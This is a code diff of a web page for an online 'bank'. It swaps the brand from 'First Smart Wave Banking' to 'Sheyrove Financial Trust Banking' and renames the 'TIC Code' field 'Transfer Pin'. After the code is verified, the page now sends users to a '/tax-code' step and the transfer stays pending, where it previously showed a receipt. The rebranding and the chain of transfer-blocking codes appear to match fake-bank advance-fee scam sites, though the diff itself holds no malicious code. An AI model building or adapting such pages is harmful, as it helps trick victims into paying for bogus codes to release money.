@@ -7,10 +7,10 @@
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>TIC Code | First Smart Wave Banking</title>
+    <title>TIC Code | Sheyrove Financial Trust Banking</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
 
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="/style.css">
     <style>
         /* --- Global Reset & Page Layout --- */
         * {
@@ -342,7 +342,7 @@
 
 
         <h1>
-            Transfer Initiate Code (TIC Code)
+            Transfer Initiate Code (TRANSFER PIN)
         </h1>
 
 
@@ -361,12 +361,12 @@
 
 
             <label>
-                Input (TIC Code)
+                Input (Transfer Pin)
             </label>
 
 
 
-            <input type="text" id="ticCode" placeholder="Enter TIC Code" required>
+            <input type="text" id="ticCode" placeholder="Enter Transfer Pin" required>
 
 
 
@@ -419,7 +419,7 @@
             <div class="message support">
 
                 Hello 👋<br>
-                Welcome to First Smart Wave Banking.
+                Welcome to Sheyrove Financial Trust Banking.
 
             </div>
 
@@ -463,10 +463,10 @@
     <script>if (!fswRequireAuth()) { }</script>
     <script>
 
-        fswInitChatWidget({
-            icon: 'customerIcon', popup: 'customerPopup', messages: 'chatMessages',
-            input: 'chatInput', send: 'sendMessage', close: 'closeChat', openDisplay: 'flex'
-        });
+        (function () {
+            const el = document.getElementById('customerService') || document.getElementById('customerIcon');
+            if (el) { el.style.cursor = 'pointer'; el.onclick = function () { location.href = '/support'; }; }
+        })();
 
 
         const ticForm = document.getElementById("ticForm");
@@ -489,7 +489,7 @@
                 }
 
                 const submitBtn = ticForm.querySelector('button[type="submit"]');
-                if (submitBtn) submitBtn.disabled = true;
+                if (submitBtn) fswBtnStart(submitBtn, 'Verifying...');
 
                 try {
                     const res = await fetch(`${FSW_API_BASE}/transfers/${transferId}/verify-tic`, {
@@ -500,16 +500,15 @@
                     const data = await res.json();
                     if (!res.ok) throw new Error(data.error || 'Invalid TIC code');
 
-                    sessionStorage.setItem('fsw_receipt_transfer_id', transferId);
-                    sessionStorage.removeItem('fsw_pending_transfer_id');
-                    window.location.href = '/receipt';
+                    sessionStorage.setItem('fsw_pending_transfer_id', transferId);
+                    window.location.href = '/tax-code';
                 } catch (err) {
                     errorMsg.textContent = err.message === 'Failed to fetch'
                         ? "Can't reach the backend — make sure it's running (npm run dev)."
                         : err.message;
                     errorMsg.style.display = "block";
                 } finally {
-                    if (submitBtn) submitBtn.disabled = false;
+                    if (submitBtn) fswBtnStop(submitBtn);
                 }
 
             });
